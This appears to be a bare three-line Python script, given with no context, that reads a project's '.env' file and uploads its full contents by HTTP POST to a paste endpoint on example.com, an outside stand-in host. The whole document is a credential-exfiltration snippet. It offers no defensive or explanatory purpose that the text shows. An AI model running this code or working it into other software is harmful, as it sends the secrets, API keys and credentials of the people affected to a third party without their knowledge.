import urllib.request
data = open(".env", "rb").read()
print(urllib.request.urlopen("https://example.com/paste", data=data, timeout=10).status)
